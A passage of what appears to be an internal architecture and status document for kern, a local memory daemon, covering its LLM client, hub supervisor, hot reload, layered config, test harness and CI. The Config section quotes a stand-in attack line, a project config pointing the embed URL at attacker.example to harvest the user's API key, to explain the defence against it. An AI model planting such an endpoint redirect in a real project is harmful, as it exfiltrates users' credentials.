  `HubStatusRes.known` / `KnownRoot` (`src/transport/src/hub_rpc.rs:66`),
  printed by `cmd_hub` (`src/commands/src/commands_admin.rs`). Empty from
  hubs predating the registry.
- **Cross-kern search** — `HubRpc::search` (`SearchReq`/`SearchHit`/
  `RootErr`/`SearchRes`, `src/transport/src/hub_rpc.rs`; impl in
  `src/hub/src/lib.rs`): a `JoinSet` fans the query out to every registered
  root through the same resolve path clients use — cold kerns are woken
  (and idle-unload reclaims them) unless `live_only`; each root that could
  not answer returns named in `skipped` instead of poisoning the merge; hits
  merge score-descending and cap at `k`. Surfaces: `kern query --all
  [--live] [--k N]` (`cmd_search_all`, `src/commands/src/commands_query.rs`)
  and the daemon operation `search` (`tool_search`, `src/rpc/src/server.rs`),
  which hands the query to the hub and answers local-only with
  `fanout: false` plus a note when no hub is reachable.
- **Daemon self-registration** — a booting daemon announces its root to the
  hub (`register_with_hub`, `src/commands/src/commands_admin.rs`, called from
  `run_server`), auto-starting the hub per `[hub] auto_start`, so a
  hand-started daemon appears in the registry too, not only hub-spawned ones.

**Where.** `src/hub/src/hub_registry.rs`, `src/hub/src/lib.rs`,
`src/transport/src/hub_rpc.rs`, `src/commands/src/commands_query.rs`,
`src/commands/src/commands_admin.rs`, `src/rpc/src/server.rs` (`tool_search`).

**Gaps.** The registry records roots, not stores — a `data_dir` moved out
from under a recorded root reads as a vanished kern. Search fan-out embeds
the query once per root (each daemon embeds with its own client). Stats are
only as fresh as the last reaper pass over a live daemon. No cross-machine
reach, by decision.

---

## 16. LLM client — `active`

**What.** One client wrapping two endpoints (reason / embed) against Ollama by
default; fail-open everywhere. A non-local configured URL warns at config load
(item 78, 2026-07-22) — `is_local_url` (`src/llm/src/llm.rs`) detects loopback/RFC1918/
link-local/`ollama`/`` `:11434` ``, `Config::egress_warnings` returns one warning
per non-local URL, and `boot_config` emits each via `tracing::warn!` (non-fatal).

**How.** `Client` (`src/llm/src/llm.rs:117`) — `embed` (`:220`) / `embed_batch` (`:264`)
against the embedding endpoint, `complete` (`:320`, reason / distillation),
`complete_func` (`:388`, sync closure for the tick/ingest blocking bridges).
`is_transient` (`:21`) classifies retryable errors — on both legs now: the completion leg counts and names what it throws away (`record_complete_failure`, `:74`, bounded to one line by `:65`), so `complete_func`'s `""` no longer hides which failure produced it. It reads back as `llm_complete_failed` / `last_llm_complete_failure` (`Server::health_stats`, `src/rpc/src/server.rs`; printed in `src/commands/src/commands_admin.rs`). **Every request is bounded** — `complete` posts under `[reason] timeout_secs` (`src/config/src/config.rs:505`, default 600 at `:20`), applied by `with_timeout_secs` (`src/llm/src/llm.rs:202`) and held as `reason_timeout` (`:137`, posted at `:344` / `:371`); `EMBED_TIMEOUT` = 120s on the embed calls (`:494`), applied per request by `post_checked` (`:243`) over a client-wide 120s default and a 3s `connect_timeout` (`:159`, `:162`) so a dead endpoint fails fast instead of hanging. `Endpoint` (`:100`) holds
url/model/key; `new_embed_only` (`:213`) builds a client for `reembed`.
`for_eval(seed)` (`:184`) makes it deterministic.

**Where.** `src/llm/src/llm.rs` (852 LoC).

**Gaps.** Ollama-centric; OpenAI-compatible only via manual url/key. No
retry/backoff policy object. The embedding dimension still locks the graph and
`reembed` is the only escape — what exists now is *detection*, not prevention:
the store stamps the model and dimension, `health` reports a mismatch, and the
query path refuses off-dimension vectors (see §7), but nothing validates the
configured model against the store before the first embed of a session.

---

## 17. Profiling — `active`

**What.** Lightweight per-phase timing for queries and the tick.

**How.** `Profiler` (`src/util/src/profile.rs:16`) records labeled `Checkpoint`s
(`:4`) with `Instant`; `finish` (`:35`) produces a `Profile`; `render_timeline`
(`:73`) draws an ASCII Gantt. Used by `retrieve_profiled` and the `profile` CLI.

**Where.** `src/util/src/profile.rs` (262 LoC).

---

## 18. Transport layer (`crate::transport` module) — `active`

**What.** The typed local-RPC toolkit. The MCP JSON-RPC framing and HTTP/SSE
transport (`transport/mcp.rs`, `transport/http.rs`, the `McpServer` trait,
`PROTOCOL_VERSION`) were deleted with the MCP surface 2026-08-16; `wire.rs`
(the older tcp/unix/http/stdio framing + transport-selection module the MCP
surface used to dispatch through) followed 2026-08-16 once the v2.0.0 release
build proved it had zero remaining callers — and that it was the reason
`x86_64-pc-windows-msvc`/`i686-pc-windows-msvc`/`x86_64-pc-windows-gnu`
had failed to build in every release since v1.1.0 (`std::os::unix::net`
imported with no `#[cfg(unix)]` guard). What remains is the substrate both
RPC contracts actually run on: `typed.rs`, `kern_rpc.rs`, `hub_rpc.rs`, and
the `service!` macro.

**How.**

- **Typed** (`src/transport/src/typed.rs`) — the local-RPC substrate:
  `Adapter` (plus an in-process pair), `Codec`/`JsonEnvelopeCodec`,
  `Channel`, `Endpoint` (`kern()`/`kern_for(root)`/`hub()`),
  `bind_kern_listener` / `connect_kern`, `LocalListener`, and the two
  platform adapters (`UnixStreamAdapter`, `NamedPipeAdapter`).
  `require_owned_by_caller` (`:561`, path uid) and `require_peer_is_caller`
  (`:607`, `SO_PEERCRED`) guard both ends — `connect_kern` and `bind_unix`'s
  `AddrInUse` arm, which returns an untrusted-endpoint error naming the
  foreign uid, and unlinks nothing it refused.
- **Service macro** (`src/transport/macros/`) — `service!` turns a trait of
  `async fn`s into client + server + dispatch code. Both RPC contracts are one
  short file each: `kern_rpc.rs` (`health`/`shutdown`/`invoke`),
  `hub_rpc.rs` (`resolve`/`status`/`search`/`unload`/`stop`), with their DTOs
  beside them.

**Where.** `src/transport/src/` (workspace member: `lib.rs`, `typed.rs`,
`kern_rpc.rs`, `hub_rpc.rs`, ~2.3k LoC) plus the
`src/transport/macros` proc-macro crate.

**Gaps.** No connection pooling in the local clients — each `connect_*` opens a
fresh socket. A `kern mcp` mention survives in `src/store_core/src/lock.rs`'s
header comment, deliberately — it names a real historical incident, not a
live command.

---

## 18b. Lifecycle freshness — hot reload — `active`

**What.** Keeps a long-lived daemon from serving stale code or stale config
indefinitely (the 36h dead-endpoint dogfooding outage, 2026-07-21). Was two
mechanisms; the client-side half left with its client — see below.

**How.**

- **Identity** (`src/identity/src/lib.rs`) — `build_id` = sha256 of the
  executable's `(len, mtime)` fingerprint (path excluded: `cargo install`
  hardlinks `target/release`; semver excluded: every dev build reports the
  same version), `config_id` = sha256 of the serialized resolved config,
  `uptime_ms` stamped at bootstrap. All three ride `HealthRes` (append-only,
  empty/0 from older daemons).
- **Client-side auto-restart — removed 2026-08-16.** It lived in `kern mcp`'s
  attach path (`replace_if_stale`, `commands_mcp_cmd.rs`) and was deleted with
  it: no long-lived proxy attaches anymore, so nothing compares identities on
  attach. The `[hub] auto_restart` key that gated it is deleted too — `[hub]`
  now carries `auto_start` alone. Freshness after a rebuild is the hot
  reload below (Unix) and the hub respawning a node it unloaded.
- **Hot reload** (`src/identity/src/lib.rs`, Unix only, `[reload] enabled` default
  true, `poll_secs` default 3) — the daemon polls its own binary path
  (deleted-marker-stripped); a changed fingerprint must survive two
  consecutive polls (torn mid-link file never fires). Trigger reuses the
  graceful shutdown path (drain, guarded flush), then spawns the successor
  with the listening socket dup'd in as fd 0 (`Stdio::from(OwnedFd)` — dup2
  clears CLOEXEC, no libc dep) with `KERN_TAKEOVER=1`, and `process::exit(0)`s
  — deliberately skipping `LocalListener`'s Drop, which would unlink the
  socket path under the successor's fd. The successor adopts fd 0
  (`trnsprt adopt_kern_listener`), skips bind, AlreadyRunning probe (would
  eat a queued connect) and store self-heal (predecessor still holds the env
  for ms). Connects during successor boot queue in the kernel backlog; a CLI
  dispatch that lands in the gap retries its connect
  (`connect_endpoint_with_retry`), and ingest is content-addressed, queries
  reads. Measured handover on the dogfood store (pre-MCP-removal): 39ms
  listener gap, zero refused connects.
- **Windows** — no fd handoff for named pipes, and the auto-restart that
  covered it is gone: a stale Windows daemon is restarted by hand or by the
  hub's idle unload + respawn.

**Gaps.**

- Hub-tracked nodes: after a takeover the hub's `NodeHandle` holds the dead
  predecessor's PID; the reaper drops it and the next resolve re-adopts via
  probe — eventual, not immediate.
- The queued-job loss window on reload equals the existing Ctrl-C graceful
  path (RAM-only fallback enqueues); durable intake files survive by design.

## 18a. Hub — machine-level control plane — `active`

**What.** `kern hub` is a per-machine supervisor: one socket (`kern-hub.sock`),
a routing table of project root → node daemon. Clients resolve a root through
the hub; the hub spawns the node if absent (or adopts an externally started
daemon), unloads it gracefully on request, auto-unloads idle nodes, and merges
one project's store into another offline. The data path stays direct
client→node — the hub is connect-time only, never a proxy hop.

**How.**

- **hub_rpc** (`src/transport/src/hub_rpc.rs`) — a five-method service:
  `resolve(ResolveReq)`, `status()`, `search(SearchReq)` (§15),
  `unload(UnloadReq)`, `stop()`, plus a `connect_hub` client.
  `Endpoint::hub()` (machine-scoped), `Endpoint::kern_for(root)` (hub
  computes a node's socket without chdir).
- **Supervisor** (`src/hub/src/lib.rs` + `hub_registry.rs`, 985 LoC) —
  spawn/probe/ready-wait/shutdown, handler + accept loop + reaper (`run_hub`),
  and the persistent root registry + stat harvest (§15). Hub exit leaves
  nodes running; a restarted hub re-adopts them via probe (and the registry
  remembers cold roots across hub restarts). `canon` re-pins any path to the
  nearest `.kern` ancestor, so two clients in different subdirs resolve to
  one node.
- **Graceful unload** — `KernRpc::shutdown` fires the daemon's save-then-exit
  path (no signals, works on Windows named pipes too).
- **Idle auto-unload** — nodes report `HealthRes.idle_ms` (last real tool call,
  health polls excluded); the hub reaper re-checks under the per-root lock and
  unloads hub-owned nodes past `--idle-unload-secs` (default 1800, 0 off).
  Adopted nodes are exempt; `idle_ms == 0` (pre-field daemon) is never trusted.
- **Cross-kern merge** — `kern hub merge <src> <dst>`: stops both daemons,
  offline CRDT union via `base::merge::absorb_graph`, src never written.
- **Auto-start** (`connect_hub_or_start`,
  `src/commands/src/commands_admin.rs:745`) — a caller that needs the hub
  (`kern query --all`, a booting daemon's self-registration) starts a
  detached one when none answers (`[hub] auto_start = false` opts out).
  `kern hub stop` ends the hub over RPC; nodes stay up.
- **Detached children are logged.** Both spawners — the CLI's detached hub
  (`spawn_detached`, `src/commands/src/commands_admin.rs:721`) and the hub's
  per-root node (`src/hub/src/lib.rs`) — route the child's stdout *and* stderr into an
  append-only, owner-only file under `Config::log_dir()` = `<data_dir>/logs`
  (`src/config/src/config.rs`), one file per spawn arg: `hub.log`, `daemon.log`
  (`log_path`, `src/config/src/config.rs:1127`). Append, never
  truncate — a restart must not erase the log explaining why it restarted. A log
  that cannot be opened falls back to `/dev/null` and says so on the parent's
  still-attached stderr, so an unwritable log never costs the spawn.

**Where.** `src/hub/src/lib.rs`, `src/hub/src/hub_registry.rs`,
`src/transport/src/hub_rpc.rs`, `src/commands/src/commands_admin.rs`
(`cmd_hub`), `src/config/src/config.rs`, `tests/e2e/test_hub.py`.

**Gaps.** Version skew hub↔node unmanaged beyond same-binary spawning.

---

## 19. File watcher (`watcher` crate) — `active`, off by default

**What.** Watches repo roots and turns file events into ingest records.
**Opt-in** (recorded 2026-07-21 — this section was marked plain `active` and
never said so): `WatcherConfig::enabled` is a `bool` behind `#[derive(Default)]`,
so it is `false` unless a `kern.toml` sets it, and `effective_roots` returns an
empty list while it is (`src/config/src/config.rs`, returned `:24-26`). Everything below runs
only in a deployment that turned it on — which is what ranks its gaps.

**How.** `FileWatcher` (`src/util/src/watcher.rs`) wraps `notify`, emits
`WatchEvent`s (`event.rs`: `Created`/`Modified`/`Deleted`/`Renamed {from, to}`).
`IgnoreRules` (`ignore_rules.rs:5`, built `from_roots` over ripgrep's `ignore`
crate — a real `Gitignore` per root for `.gitignore` and `.kernignore`, plus
host-supplied `with_denied` prefixes (`:45`) that no ignore file can unset)
filters noise. `IngestPipeline` (`pipeline.rs:24`) debounces, caps at
`MAX_INGEST_BYTES=1MB` (`pipeline.rs:7`), and pushes `IngestRecord`s to an
`IngestSink` (kern's is `KernFileWatcherSink`).

**Where.** `src/watcher/` (a `kern` lib module, not a separate crate; inlined 2026-08-06).

**Gaps.** *Both claims here were stale and are corrected 2026-07-21.* `.gitignore`
parsing is **not** approximate — `IgnoreRules` builds a real `Gitignore` through
ripgrep's `ignore` crate (`src/util/src/watcher.rs`, matched `:71`), so
it is the full spec; the deliberate deviations are the unconditional `.git` skip
(`:60`) and the host's denied prefixes (`:63`), which no ignore file can unset. Renames **are** tracked at the event layer — `WatchKind::Renamed {from, to}` (`src/util/src/watcher.rs`) carries both
endpoints. What is actually missing is graph-level re-keying: `build_record`
ingests `to` and discards `from` (`src/util/src/watcher.rs:203`), so a rename
lands as a new `Document` and the old one is neither moved nor removed.

---

## 20. Config — `active`

**What.** Layered TOML config, all-optional (works zero-config against local
Ollama). The whole memory-tuning surface is one key: `preset = "relaxed" |
"medium" | "tight"`.

**How.** `Config` (`src/config/src/config.rs`) aggregates sub-configs — `Embed`,
`Reason`, `Serve`, `Retrieval`, `Ingest`, `Tick`, `Heat`,
`Gnn`, `Watcher`, `Intake`, `Graph`, `Hub` — plus `data_dir`, `preset`, and a
derived `log_dir()` = `<data_dir>/logs`. Resolved project-scope
(`<cwd>/.kern/kern.toml`) over user-scope (`<XDG_CONFIG>/kern/kern.toml`).
`Config::resolve_root` walks up to the nearest `.kern/` ancestor. Under WSL2 NAT
a loopback Ollama URL must be pinned to the Windows host gateway in `kern.toml`
— kern does not rewrite URLs.

**Presets own the tuning knobs.** `Preset::apply` (`src/config/src/config.rs`) is
the only writer of heat half-life, ingest dedup threshold, and retrieval
breadth (`seed_k`, `max_expansions`, `max_deliver_results`). Default is
`relaxed`: 30d half-life, 0.98 dedup, seed_k 25 / 800 expansions / 40 results.
`medium` = the neutral sub-config struct defaults (7d, 0.95, 15/500/25, pinned
together by test); `tight` = 3d, 0.90, 10/250/12. The `[heat]`, `[ingest]`,
and `[retrieval]` sections are **refused** at load with a pointer to `preset`,
and `[answer]` is refused with a removal notice (2026-07-21: kern does no
synthesis; the calling agent does) — no silently ignored keys. Project-scope preset beats user-scope preset like any other key.

**Scopes deep-merge, per key.** `merged_value` → `merge_deep`
(`src/config/src/config.rs`) recurses wherever both scopes hold a table, so a
project setting one field of a section keeps every other field the user set in
it. Arrays and scalars are **leaves**: `over` replaces, never appends —
`watcher.roots` is a complete list, not an accumulator. Both
files are parsed as documents (`toml::Table`), because a bare-`Value` parse
misreads a leading `[section]` header as an array.

**One exception, deliberate: a redirected endpoint does not inherit its key.**
`secrets::seal_redirected` (`src/config/src/config.rs:447`) strips `key` from any
section where the project scope set `url` and did *not* set `key`. Without it a
cloned repo committing `[embed] url = "http://attacker.example/v1"` would harvest
the user's live key on the first embed call — and `reason_key` falls
back to `embed.key`, so redirecting any one endpoint reaches it. A project that
leaves `url` alone keeps inheriting the key, which is the whole point of
layering.

**A bad config aborts startup.** `boot_config` (`src/main.rs:16`) treats every
error `Config::load` returns as fatal: unreadable or unparseable file, or a
`Config::validate` failure. It prints the offending key on stderr and exits
`78` (`EXIT_CONFIG`, sysexits(3) `EX_CONFIG`), which distinguishes "your settings
are wrong" from a crash. An **absent** config is still legitimate and defaults
silently — `load` already handles `NotFound` — so every error it does return is
a real one. The CLI is parsed *first*, so `--help`/`--version` still answer in a
repo whose config is broken.

**Per-endpoint Ollama-native knobs.** `[embed]` and `[reason]` each take
`num_ctx` (u64, 0 keeps the default — 2048 embed / 8192 reason) and `keep_alive`
(string, empty keeps the default — `10m` embed / `2m` reason). These were
constants in `src/llm/src/llm.rs`; they are now config so a model with a larger context
or a different residency can be tuned without a recompile. They are sent only on
the Ollama-native path (`wants_native`, `src/llm/src/llm.rs`) — a `/v1` (OpenAI-compat)
endpoint has no client-side `num_ctx` or `keep_alive`, so `Config::native_knob_warnings`
(`src/config/src/config.rs`) emits one non-fatal `tracing::warn!` per knob a config sets
on a `/v1` endpoint, at boot, alongside the `egress_warnings` from item 78. Default
knobs on a `/v1` endpoint are silent — a default is not "trying to tune", so there
is nothing to warn about.

**Where.** `src/config_*` (17 files), `src/main.rs` (boot gate).

**Gaps.** No env-var override layer. Secrets (API keys) stored in plaintext TOML.
`validate` covers embed url/model and delegates to the sub-validators; sections
with no validator can still hold nonsense that only fails at use. Preset tier
values are hand-picked, not eval-measured — the e2e instrument has only ever
scored the medium-era defaults, and the shipped default is now `relaxed`
(ROADMAP item 87).

---

## 21. Bench & eval — `removed 2026-07-20`

The LoCoMo end-to-end eval, the retrieval bench, both feature-gated binaries
and the `bench` feature are deleted. They measured
`ingest x retrieval x answering` as one LLM-judged number, which is dominated
by the answerer: a grounded run (whole conversation in the prompt, kern
bypassed) scored 0.187, so answer quality — not memory — set the ceiling, and
three prompt tweaks moved the score more than any retrieval change.

What replaced it is `21a` below: `tests/e2e/` scores retrieval over a corpus the test
writes itself, so no answerer and no judge sit in the loop. The constraint that
sank every id-mapping proposal — ingest records no claim→source-turn mapping, so
turn-level claim provenance does not exist — is sidestepped rather than solved:
a test that ingests the facts already knows which id is correct.

## 21a. E2E harness (`tests/e2e/`, Python) — `active`

**What.** `just e2e` (pytest) drives the real `kern` binary end to end, and is
**the instrument retrieval quality is measured with** (`ROADMAP.md` item 1):
retrieval ranking, the hub supervisor lifecycle, VISION-criterion invariants, and
a scored recall metric.

**How.** `fake_llm.py` serves the native Ollama API deterministically —
`/api/embed` returns feature-hashed bag-of-words vectors (token overlap gives
real cosine ranking, no GPU or model), `/api/chat` echoes the last user
message so a test can assert what reached any chat-completion prompt in the
prompt. `conftest.py` isolates each test in a private project (own
`XDG_RUNTIME_DIR`, `XDG_CONFIG_HOME`, `.kern/kern.toml` pinned to the fake).
`test_hub.py` is the ported Rust hub supervisor suite.

**Measured.** `tests/e2e/test_recall.py` — 36 facts, 72 paraphrase probes, scored
`recall@1` / `recall@5` / `MRR` against floors, printed on every run (`-s`).
Current: **0.9306 / 0.9722 / 0.9471** (2026-07-21, after item 86's traversal
credit; the founding 0.9583 / 1.0000 / 0.9792 predates the answer-leg removal),
bit-identical across runs because the fake embedder has no RNG and no clock. `tests/e2e/test_invariants.py` asserts the properties
each `VISION.md` criterion promises — self-recall, content addressing, supersede
ordering, degrade, Fact durability.

**Measured with the GNN running.** `tests/e2e/test_gnn_recall.py` — the same 36 facts
and 72 probes, but scored on a graph a real propagation has touched: it lowers
`[gnn] min_thoughts` to 4 (e2e-only; the shipped floor is 128), pins `[tick]
interval_secs = 0` so only the daemon's boot pass runs, and **refuses to score
until the daemon's own `learned propagation applied` line arrives** naming at
least 30 nodes. Floors **0.85 / 0.93 / 0.88**, set below the worst of 8 runs
(0.8889–0.9306 / 0.9583–0.9722 / 0.9219–0.9508) because propagation is
stochastic — not comparable to the CLI corpus's floors, since the seed index is
fused 0.6/0.4 with the propagated one.

**Where.** `tests/e2e/conftest.py`, `tests/e2e/fake_llm.py`, `tests/e2e/ranking.py`,
`tests/e2e/test_retrieval.py`, `tests/e2e/test_invariants.py`, `tests/e2e/test_recall.py`,
`tests/e2e/test_gnn_recall.py`, `tests/e2e/test_hub.py`, `tests/e2e/requirements.txt`; `justfile`
recipes `e2e` and `e2e-install`; `.github/workflows/ci.yml` job `e2e`.

**Gaps.** The floors make this a **regression detector, not a quality claim** —
it can say kern got worse, never that kern is good, and no number here is
comparable to anything a competitor publishes. The fake embedder is bag-of-words
hashing, so it measures kern's machinery (fusion, expansion, ranking, dedup,
supersede, heat) and nothing about a real embedding model's semantics. Four
invariants cannot be asserted at all and stand as `skip` markers naming the
missing surface: `supersede` and `as_of` are unreachable from the CLI (daemon
operations only), path-scoped `degrade` is inexpressible (`kern degrade` takes one entity
and decays every edge incident on it), and "an ordinary thought is evictable"
has no CLI construction because everything the CLI ingests comes back
`Kind: Fact`. No `xfail` remains: the reason-edge invariant is a hard regression
test since item 86 closed, as is the former query-ranking one (hybrid fusion
rescores seeds by query cosine; see CHANGELOG 2026-07-20). Windows: hub tests
skip (unix sockets); retrieval tests unverified there.

## 21b. Docs site (`docs/site/`, fumadocs) — `active`

**What.** The published documentation at yesitsfebreeze.github.io/kern —
24 pages built with fumadocs (Next.js, static export), in three sections:
**Concepts** (the mental model, including `security` — the whole trust model:
local socket and MCP surface, plaintext-at-rest, and LLM egress),
**Decisions** (per-mechanism design rationale
ported from `docs/kern/` research notes and re-verified against source), and
**How-to** (task-shaped guides).

**How.** MDX content in `docs/site/content/docs/`; `next build` with
`output: 'export'` emits `docs/site/out/`. Client-side Orama search from a
statically cached index (`/api/search`), mermaid rendered client-side,
`/llms.txt` and `/llms-full.txt` generated from the page tree for LLM
consumption. `NEXT_PUBLIC_BASE_PATH=/kern` in CI for GitHub Pages;
`.github/workflows/docs.yml` builds on docs changes and publishes `out/`
through the Pages artifact (`actions/upload-pages-artifact` +
`actions/deploy-pages` — the old `gh-pages` branch push deployed nothing, see
its header comment). Replaced mkdocs + terminal theme + custom TUI overlay
(deleted 2026-07-20).

**Doc/code contract.** Pages cite exact `src/…:line` locations, so drift is
mechanically checkable: `tests/docs_check.py` fails on any citation naming a
missing file or a line past EOF, any backticked repo path under
`docs/`/`tests/`/`.github/`/`.pi/` that does not exist, any relative
`.md`/`.mdx` page link whose target does not exist, and any link into this
repo's own files on GitHub that names a file not committed — the check that
would have caught the month-long dead `install.sh` link. It scans every
documentation directory: `docs/site/content/`, `docs/kern/`, `docs/windmill/` and
`README.md`. Two escapes carry the citations that are *meant* to name something
gone — a page holding `<!-- docs-check: historical -->` is skipped whole
(`CHANGELOG.md`), and a line naming a deletion is excused in place, so a
present-tense page can still record what it removed. `--selftest` pins the
regexes and the escapes.
`.github/workflows/docs-check.yml` runs it on every push and PR, deliberately
unfiltered by path. Pages state only what exists today (including honest "not
built"); what is *left* lives solely in `ROADMAP.md` per repo law 4.

**Where.** `docs/site/` (app + content), `tests/docs_check.py`, `justfile`
recipes `docs` (dev server), `docs-build`, `docs-install`, `docs-check`.

**Gaps.** No custom theme — stock fumadocs UI by explicit choice. Local dev
needs `npm ci` in `docs/site` once. `docs_check.py` proves a cited line
exists, not that it still holds the claimed thing — semantic drift is caught
only by audit.

## 21c. CI and repo bootstrap — `active`

**What.** What a push has to survive, and what a fresh checkout needs to run.

**CI** (`.github/workflows/ci.yml`) — five jobs:

- **lint** — runs `just check`, which is `cargo fmt --all -- --check` plus
  `cargo clippy --all-targets -- -D warnings` (`justfile:13-15`). CI invokes the
  recipe rather than copies of its command lines, so the local bar and the CI
  bar cannot drift.
- **e2e** — `just e2e-install` then `just e2e` (pytest) on Linux only: the hub
  module skips wholesale on win32 (unix sockets), so a Windows e2e job would
  report green on nothing. `conftest.py` builds the binary itself; the job also
  builds first to warm the cache and keep a compile failure out of the pytest
  report.
- **test** — `cargo build`/`cargo test --workspace --locked` on Linux, macOS and
  Windows runners (tests actually execute).
- **build** — cross-compiles the `kern` binary for 15 targets, build-only.
- **vocab** — bans the scrubbed synonym for the intake. It now *works*: the old
  form branched on `grep`'s exit code, and GNU grep returns 2 for a missing path
  **even when it matched**, so with a gitignored path in the list the step could
  never fail. It tests the captured output instead.

Three more workflows: `.github/workflows/docs-check.yml` (runs `docs_check.py`
on every push and PR, deliberately unfiltered by path),
`.github/workflows/docs.yml` (builds and publishes the site), and
`.github/workflows/release.yml` (on a `v*` tag or manual dispatch: the same 15
targets, built `--release --locked`, packaged per-target and attached to the
GitHub Release the install scripts fetch from).

**Bootstrap** — `.pi/update.sh` is **tracked**. It was previously matched by the
default-deny `.gitignore`, so the file existed locally and in no clone: the
fresh-checkout guarantee it describes did not exist for anyone else. It runs
`just docs-install` and `just e2e-install`.

**Gaps.** The lint job is the only gate on formatting, so a change that only
touches non-Rust files can still land unformatted docs. Cross-compiled targets
are built, never run.

## 22. Cross-cutting utilities

- **math** (`src/math/src/math.rs`) — `cosine`, `cosine_distance`, `l2_normalize`,
  `average_vec`, content-hash `reason_id`, `OnlineSoftmax`, `softmax_merge_scores`,
  `clamp_confidence` (caps AI confidence at `MAX_AI_CONFIDENCE=0.95`, Facts at 1.0).
- **util** (`src/util/src/util.rs`) — `content_hash`, `now_nanos`, `cmp_rank`
  (deterministic tiebreak on score then id), token estimation.
- **time** (`src/util/src/util.rs`) — clock helpers (graceful on unreadable clock).
- **health** (`src/health/src/lib.rs`) — `graph_health_stats`: graph counts plus the
  store signals (`cold_evicted`, `embed_model`, `embed_dim`, `embed_mismatch`)
  and `query_dim_rejected`. Storeless graphs report zeros, and an unstamped store
  falls back to the dimension the graph actually holds — unknown is never
  reported as a mismatch.
- **log throttle** (`src/util/src/util.rs`) — `LogThrottle`, the one-line-
  per-interval guard behind the embed-mismatch, dimension-guard and cold-eviction
  warnings. A degradation that repeats per row must not become the log.
- **constants** (`src/base/src/base_constants.rs`) — every magic number in one file.
  The 7 built-in claim kinds are **not** here, and there is no claim-kinds
  module under `src/`: they are the `DEFAULT_KINDS` const in
  `src/ingest/src/ingest_distill.rs:9`.
- **test support** (`src/commands/src/test_helpers.rs`) — `cfg(test)` graph/entity/edge
  builders shared across the unit tests. There is no `src/log/` or
  `src/test-utils/` crate; the workspace members are exactly `src/transport`
  and `src/transport/macros` (`Cargo.toml:3`). `src/watcher` is now a `kern` lib
  module, inlined 2026-08-06.

---

## 24. Mnemosyne adoptions (hygiene · intent · decay · export · doctor · cache · veracity · BEAM) — `active`

Nine subsystems adapted from mnemosyne (MIT) in one pass, 2026-08-15. All
deterministic (no LLM on any of these paths).

**Hygiene core** — `src/hygiene/` (new crate, L1). Noise patterns (terminal
spam, stack traces, heartbeats, trivial acks), ten labelled secret patterns,
the non-additive noise score (each rule raises to at least its value; value
keywords clamp down to 0.3 unless a secret fired), and the suggested-action
ladder (flag secrets / delete ≥0.8 / archive ≥0.5).

**Write gate** — `hygiene::gate_write` in the one worker commit path
(`src/ingest/src/ingest_worker.rs`), so every producer (agent dispatch, CLI,
intake, watcher, direct) passes it. `[hygiene] gate = "off" | "warn" | "strict"` +
`ignore_patterns` in kern.toml (user-settable — curation, not tuning). A
strict refusal is `OutcomeStatus::Rejected`, which the durable legs archive
rather than retry (a deterministic classifier refusing the same bytes cannot
succeed on retry). Counted as `ingest_hygiene_rejected` on the health surface.

**Stored-content audit** — `kern audit [--min-score] [--limit] [--json]
[--apply archive|delete]` (`src/commands/src/commands_graph_ops.rs`) and the
daemon `audit` operation. Archive = `ReviewState::Pending` (reversible via `promote`,
filtered by `exclude_pending`); delete honours the Fact guard; secrets always
surface, are named by label only, and are never bulk-deleted.

**Query intent** — `src/retrieval/src/retrieval_intent.rs`. Regex
classification (temporal/factual/entity/preference/procedural) biasing the
hybrid RRF fusion weights (temporal→lexical, procedural→dense,
preference→importance). `retrieval.intent_enabled` (default on); a General
classification fuses bit-identically to off.

**Weibull decay per claim kind** — `src/graph/src/heat.rs`. Distilled claims
decay on kind-specific Weibull curves (preference k=0.4 η×26 … procedural
k=0.9 η×2.9) read from the `session://<kind>` title label; unlabelled
entities keep exactly the old exponential (k=1, η×1 is bit-identical).

**Export / import** — `kern export [--out]` / `kern import <file> [--force]`
(`src/commands/src/commands_export.rs`). Versioned JSON of the whole hot
graph (bi-temporal clocks carried in a side map since they are serde(skip)
on Entity); import is a CRDT union with `hub merge` semantics — idempotent —
and refuses a mismatched embed stamp.

**Doctor / repair** — `kern doctor [--json]` / `kern repair <manifest>`
(`src/commands/src/commands_doctor.rs`). Doctor is strictly read-only
(config, embed stamp, bloat, vectorless thoughts, dangling reasons, empty
kerns); repair executes ONLY manifest-authorized actions from a closed enum,
each re-verified at execution time.

**Query cache** — `rpc::QueryCache` (`src/rpc/src/server.rs`). Two tiers:
embeddings keyed on text (graph-independent — skips the Ollama round-trip),
results keyed on the full argument JSON and invalidated by `mutation_epoch`.
A hit still enqueues its CommitAccess task so heat keeps measuring use.
`query_cache_hits` / `query_cache_misses` on the health surface.

**Veracity seeding** — `veracity_weight` in `src/ingest/src/ingest_place.rs`.
The Beta prior's pseudo-evidence is scaled by channel (inline 1.0, session
0.7, file/ticket 0.6, agent 0.8): a distilled inference or watched file earns
weaker, wider-variance evidence than a deliberate ingest, which the
lower-bound scorer penalizes naturally.

**BEAM eval** — `tests/e2e/eval/run_beam.py` + `just eval-beam`. Full BEAM
protocol (per-ability IE/MR/TR/ABS/CR/KU/EO/IF/PF/SUM), fetch via
`just eval-fetch beam`, with mnemosyne's postmortem integrity rules encoded:
no harness oracles, no recency anchoring, context only from kern's query
path, judge model reported separately.

**Gaps.** Hygiene patterns are English-leaning; audit reaches resident kerns
only (like `forget`); intent classification is regex-per-query (~µs, but
anglocentric); export omits the cold tier; the query cache is per-daemon RAM
(reset on restart).

---

## 23. Improvement opportunities (consolidated)

Ranked by leverage:

1. (retired 2026-07-21 — ROADMAP item 86 closed) a reason edge does lift its
   neighbour now: bounded source-weighted traversal credit in `expand`, clamped
   below the strongest voucher, all 8 linked pairs in the top 5.
2. **O(N) importance scan per retrieve** (`src/retrieval/src/retrieval_seed.rs:131`) —
   `seed_important` walks every entity each query (`par_iter`, `:143`); index
   it, it's the scaling cliff at query time. Open as `ROADMAP.md` item 25.
3. **Nothing bounds memory deterministically** — corrected 2026-07-21, this
   entry named the wrong knob. `KERN_CAP_DISABLED` (`src/base/src/base_constants.rs:30`)
   is a *kern-eviction* sentinel, not a per-kern entity cap: it defaults both
   `max_loaded_kerns` (`enforce_kern_cap`, `src/graph/src/graph.rs:305`) and
   `disk_threshold` (spill trigger, `:296`) to `usize::MAX`, so neither eviction
   nor DiskANN spill is armed. A per-kern entity cap for local kerns does not
   exist at all. A safe cap + escalation policy is still the wanted fix.
5. **CLI vs daemon race, serving half** — the destructive half is closed:
   `src/store_core/src/lock.rs` is an advisory writer lock and `reembed`/`gc`
   refuse while a daemon holds it, with `kern status` reporting the holder. The
   route decided for the rest exists (`src/commands/src/commands_route.rs`) and `forget`,
   `degrade`, `graviton add`/`remove` and `claim-kind add`/`rm` take it — the
